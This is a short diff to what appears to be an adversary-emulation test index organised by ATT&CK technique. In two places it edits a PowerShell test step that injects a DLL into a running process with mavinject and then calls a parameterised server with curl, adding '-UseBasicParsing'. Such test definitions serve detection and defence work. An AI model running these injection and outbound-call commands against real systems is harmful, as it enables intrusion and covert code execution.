@@ -18691,7 +18691,7 @@ credential-access:
       executor:
         command: |
           mavinject $pid /INJECTRUNNING #{file_name}
-          curl #{server_name}
+          curl #{server_name} -UseBasicParsing
         name: powershell
         elevation_required: true
   T1110.004:
@@ -24328,7 +24328,7 @@ collection:
       executor:
         command: |
           mavinject $pid /INJECTRUNNING #{file_name}
-          curl #{server_name}
+          curl #{server_name} -UseBasicParsing
         name: powershell
         elevation_required: true
   T1074:
